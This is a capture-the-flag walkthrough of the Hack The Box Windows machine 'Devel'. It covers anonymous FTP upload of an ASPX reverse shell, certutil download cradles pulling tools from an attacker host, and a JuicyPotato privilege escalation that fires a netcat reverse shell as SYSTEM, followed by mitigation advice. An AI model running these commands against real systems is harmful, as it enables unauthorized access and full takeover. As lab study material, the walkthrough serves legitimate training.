```
#htb #hackthebox #windows #easy #devel #rustscan #nmap #ftp #anonymous-login #ms15-034 #http-sys #iis #aspx-reverse-shell #juicypotato #seimpersonateprivilege #privilege-escalation #oscp-like
```

### Methods

```
# Alternative Methods - Devel HTB

## Reconnaissance
- Method 1: RustScan + Nmap targeted scan (Current)
- Method 2: Nmap full port scan (-p-)
- Method 3: Masscan

## Initial Access (FTP)
- Method 1: Anonymous FTP login + mget to grab site content (Current)
- Method 2: Anonymous FTP login + put aspx webshell directly (Current)
- Method 3: MS15-034 HTTP.sys DoS/RCE (identified but not used)

## Gaining a Shell
- Method 1: aspx reverse shell uploaded via FTP, triggered via HTTP request (Current)
- Method 2: msfvenom windows/meterpreter/reverse_tcp .aspx payload
- Method 3: Metasploit iis_webdav_upload_asp / ftp module

## Privilege Escalation
- Method 1: JuicyPotato abusing SeImpersonatePrivilege (Current)
- Method 2: MS15-034 HTTP.sys kernel exploit
- Method 3: Known Windows 7 SP-less kernel exploits (e.g. MS16-032, MS10-059)
- Method 4: Metasploit local exploit suggester + auto privesc module
```

# Devel - HTB Walkthrough

## Box Info

| Field | Details |
|-------|---------|
| Name | Devel |
| Difficulty | Easy |
| OS | Windows 7 Enterprise (Build 7600) |
| IP | 10.129.30.84 |
| Hostname | DEVEL |

---

## Attack Chain

```
RustScan → Nmap (FTP + IIS) → Anonymous FTP Login → Upload aspx Reverse Shell → Shell as iis apppool\web → SeImpersonatePrivilege Found → JuicyPotato → NT AUTHORITY\SYSTEM
```

---

## Reconnaissance

### RustScan

```bash
rustscan -a 10.129.30.84
```

```
>>>
Open 10.129.30.84:21
Open 10.129.30.84:80
```

### Nmap Targeted Scan

```bash
nmap 10.129.30.84 -p21,80 -sCV --script ftp-vuln*,http-vuln*
```

```
>>>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|     Disclosure date: 2015-04-14
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> Key Insight: Only two ports open — FTP (21) and IIS 7.5 (80). Nmap's NSE flags the box as vulnerable to **MS15-034 (HTTP.sys RCE)** right away, but the FTP anonymous login turns out to be the faster path in.

---

## Enumeration

### Anonymous FTP Login

```bash
ftp 10.129.30.84
```

```
>>>
Connected to 10.129.30.84.
220 Microsoft FTP Service
Name (10.129.30.84:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

```bash
ftp> ls
```

```
>>>
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

```bash
ftp> mget *
```

> Key Insight: Anonymous FTP is enabled with **write access**, and the FTP root maps directly to the IIS webroot. Anything uploaded via FTP is instantly reachable over HTTP.

---

## Initial Access

### Uploading an ASPX Reverse Shell

Used the classic ASPX reverse shell from [aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell), edited with attacker IP/port, then uploaded it over the same anonymous FTP session:

```bash
ftp> put shell.aspx
```

### Catching the Shell

Started a listener, then triggered the payload with a simple HTTP request:

```bash
nc -lnvp 443
```

```bash
curl http://10.129.30.84/shell.aspx
```

```
>>>
listening on [any] 443 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203
```

---

## Post-Exploitation Enumeration

### whoami /all

```cmd
whoami /all
```

```
>>>
USER INFORMATION
----------------
User Name       SID                                                           
=============== ==============================================================
iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

> Key Insight: **SeImpersonatePrivilege is Enabled** for the IIS app pool identity — this is the classic "Potato family" privesc trigger on any pre-2016-patched Windows box.

### systeminfo

```cmd
systeminfo
```

```
>>>
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Manufacturer:       VMware, Inc.
System Type:               X86-based PC
```

---

## Privilege Escalation

### Delivering JuicyPotato

Hosted the JuicyPotato binary and `nc.exe` on an attacker HTTP server, then pulled them down with the built-in Windows download cradle:

```cmd
certutil -urlcache -split -f http://10.10.15.249:8080/Juicy.Potato.x86.exe C:\Windows\Temp\Juicy.Potato.x86.exe
certutil -urlcache -split -f http://10.10.15.249:8080/nc.exe C:\Windows\Temp\nc.exe
```

### Catching the SYSTEM Shell

```bash
nc -lnvp 4411
```

Abused **SeImpersonatePrivilege** with JuicyPotato, spawning `cmd.exe` under a SYSTEM-authenticated COM object and using it to fire a reverse shell:

```cmd
Juicy.Potato.x86.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.249 4411" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

```
>>>
listening on [any] 4411 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.30.84] 49203

C:\Windows\system32>whoami
nt authority\system
```

> Key Insight: JuicyPotato coerces a privileged COM server (via a known CLSID) into authenticating locally as SYSTEM, then hijacks that token via `SeImpersonatePrivilege` to spawn a process with full SYSTEM rights — no exploit CVE required, just a design quirk of Windows RPC/DCOM activation.

### Capturing the Flags

```cmd
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

```
>>>
26cce6baf1fc22e1ea417098d3a0128e
ab18e7b8b9048f35e82e37484691abd7
```

---

## Summary

| Phase | Detail |
|---|---|
| **Enumeration** | Only FTP (21) and IIS 7.5 (80) open; MS15-034 flagged by Nmap NSE |
| **Initial Access** | Anonymous FTP with write access → uploaded aspx reverse shell to IIS webroot |
| **Shell Obtained As** | `iis apppool\web` |
| **Privilege Escalation** | SeImpersonatePrivilege enabled → JuicyPotato COM/DCOM token theft |
| **Final Access** | `nt authority\system` |
| **User Flag** | `26cce6baf1fc22e1ea417098d3a0128e` |
| **Root Flag** | `ab18e7b8b9048f35e82e37484691abd7` |

### Tools Used

| Tool | Purpose |
|---|---|
| RustScan | Fast initial port discovery |
| Nmap | Service/version detection + vuln scripts |
| ftp (CLI) | Anonymous login, directory listing, file upload |
| aspx-reverse-shell | ASPX web shell for initial code execution |
| netcat (nc) | Reverse shell listener |
| certutil | File download cradle on target |
| JuicyPotato | SeImpersonatePrivilege abuse → SYSTEM |

---

## Mitigation

| Finding | Recommendation |
|---|---|
| Anonymous FTP enabled with write access | Disable anonymous FTP, or make it strictly read-only |
| FTP root shared with IIS webroot | Separate FTP upload directory from the web-servable directory |
| No file-type/content validation on uploads | Block execution of uploaded scripts; validate file contents, not just extension |
| SeImpersonatePrivilege on IIS app pool identity | Run app pools under a restricted account; apply Potato-family mitigations (Windows updates, token restrictions) |
| Windows 7 Build 7600, no patches (KB0) | Apply all available hotfixes — MS15-034 and multiple kernel privesc CVEs are unpatched here |
| EOL operating system (Windows 7) | Upgrade to a supported OS or isolate behind strict network controls |
